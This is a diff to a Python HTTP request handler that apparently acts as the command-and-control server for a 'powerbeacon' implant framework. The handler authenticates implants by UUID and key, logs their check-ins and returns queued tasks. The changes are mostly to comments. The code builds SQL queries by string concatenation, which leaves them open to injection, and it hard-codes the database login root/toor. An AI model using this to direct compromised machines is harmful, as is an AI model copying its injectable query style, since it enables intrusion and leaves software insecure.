@@ -74,13 +74,14 @@ class HandleRequests(BaseHTTPRequestHandler):
         yellow="\33[33m"
         blue="\33[34m"
         
-        dicto = {}
-        line_check = {}
+        #dicto = {}
+        #line_check = {}
         send_task = ''
         #reads post request body
 
         self._set_headers()
         try:
+            #Read the contents and convert to a dictionay formate we can use
             content_len = int(self.headers['Content-Length'])
             post_body = self.rfile.read(content_len)
             post_body = post_body.decode("utf-8")
@@ -92,7 +93,7 @@ class HandleRequests(BaseHTTPRequestHandler):
             print(yellow+date_time+"[*]Request from  IP: " + IP + " :::Malformed Request"+default)
             return 0
 
-        #Identify UUID
+        #Pull vars from dict
         connection=MySQLdb.connect(host='127.0.0.1',user='root',password='toor',database="powerbeacon")
         try:
             UUID=new_obj["UUID"]
@@ -105,28 +106,28 @@ class HandleRequests(BaseHTTPRequestHandler):
             return 0
 
         cursor=connection.cursor()
-        #check if implant exists at all 
+        #check if implant exists
         query = "select * from implants where UUID='" + UUID +"'"
         cursor.execute(query)
         results=cursor.fetchall()
-        if (len(results)<1):  #if it doesn't exist write implant not found
+        if (len(results)<1):  #if it doesn't exist write implant not found and return
             date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
             print(red+date_time+"[*]Request from " + UUID + " at IP: " + IP + " :::IMPLANT NOT FOUND"+default)
             connection.close()
             return 0
-        ###Check if key matches    
+        #Check if key matches    
         query = "select * from implants where UUID='" + UUID +"' and implantkey='"+key+"'"
         cursor.execute(query)
         results=cursor.fetchall()
         if (len(results) > 0):
-            if (request=="req"):##only is requests
+            if (request=="req"):#only if requests
 #                cursor.execute("update checkins set last_checkin=now() where UUID='" + UUID +"'")
                 cursor.execute("INSERT INTO checkins (UUID,gateway) VALUES ('" + UUID +"','" + IP + "')")
                 cursor.execute("commit")
                 should_get = True
                 query = "select task from tasks where UUID='" + UUID +"' and is_complete = 0"  #check for tasks...we should only do this is it's a request.  fix this later
                 cursor.execute(query)
-                results=cursor.fetchall() ###results is tasks
+                results=cursor.fetchall() ###results are the tasks from the DB
                 
                 if (len(results) > 0):#if tasks are greater than none
                     date_time=datetime.now().strftime("%d_%m_%Y_%H%M%S")
@@ -134,9 +135,9 @@ class HandleRequests(BaseHTTPRequestHandler):
                     #prepare line to return
                     send_task=''
                     for result in results:
-                        send_task=send_task+str(result[0])+";"
+                        send_task=send_task+str(result[0])+";"  #concat all tasks with a ";" between
                     self.wfile.write(send_task.encode("utf-8"))
-                    ####and update the tasks so they are complete
+                    ##and update the tasks so they are marked complete in the DB
                     query = "update tasks set is_complete = 1 where UUID = '" + UUID + "'"
                     cursor.execute(query)
                     query="commit"
